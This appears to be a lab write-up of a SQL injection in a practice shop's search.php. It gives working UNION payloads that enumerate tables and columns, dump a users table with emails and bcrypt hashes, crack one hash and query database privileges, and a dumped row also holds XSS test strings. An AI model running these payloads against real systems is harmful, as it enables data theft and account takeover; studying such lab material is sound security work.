---
layout: default
title: TechShop
---
### SQL in search.php

SQL Injection in `/search.php?q=`, with payload:

tables:

```
LOL' OR '1'='1') union select (select group_concat(table_name) from information_schema.tables where table_schema='techshop'),null,null,null,null,null,null,null # a
```

get back this:

```
coupons,order_items,orders,products,sessions,users
```

columns of users table:

```
```
```
LOL' OR '1'='1') union select (select group_concat(column_name) from information_schema.columns where table_name='users'),null,null,null,null,null,null,null # a
```

get back this:

```
address,created_at,email,full_name,id,password,phone,profile_picture,role,username
```


dumo whole users table:

```
LOL' OR '1'='1') union select (select group_concat(address,'~',created_at,'~',email,'~',full_name,'~',id,'~',password,'~',phone,'~',profile_picture,'~',role,'~',username) from users),null,null,null,null,null,null,null # a
```

and got back:

| ID  | Full Name                   | Username   | Email                | Phone    | Address                                | Role  | Created At          | Avatar             | Password Hash                                                  |
| --- | --------------------------- | ---------- | -------------------- | -------- | -------------------------------------- | ----- | ------------------- | ------------------ | -------------------------------------------------------------- |
| 1   | System Administrator        | admin      | admin@techshop.local | 555-0100 | 123 Admin Street, Tech City, TC 12345  | admin | 2026-05-19 08:10:36 | default-avatar.png | `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi` |
| 2   | John Doe                    | john_doe   | john@example.com     | 555-0101 | 456 User Lane, Tech City, TC 12346     | user  | 2026-05-19 08:10:36 | default-avatar.png | `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi` |
| 3   | Jane Smith                  | jane_smith | jane@example.com     | 555-0102 | 789 Customer Blvd, Tech City, TC 12347 | user  | 2026-05-19 08:10:36 | default-avatar.png | `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi` |
| 4   | Bob Wilson                  | bob_wilson | bob@example.com      | 555-0103 | 321 Buyer Road, Tech City, TC 12348    | user  | 2026-05-19 08:10:36 | default-avatar.png | `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi` |
| 5   | `<script>alert(1)</script>` | myname     | myemail@mail         | 12345    | `<script>alert(1)</script>`            | user  | 2026-05-19 09:21:07 | default-avatar.png | `$2y$10$p14eHJmybml2fiW4K.NCjOlkN2d66R69rIjwjYqMI.yc834.s3YcC` |

using [hashes.com](hashes.com), I managed to crack the hash `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi:password`. So, the password of all users except the last user, is `password`.

Trying to check for user privileges:

```
LOL' OR '1'='1') union select (select group_concat(grantee,'~',privilege_type,'~',is_grantable) from information_schema.user_privileges),null,null,null,null,null,null,null # a
```

got back:

```
techshop_user'@'%' USAGE NO
```

So, we can't do nothing with this user.

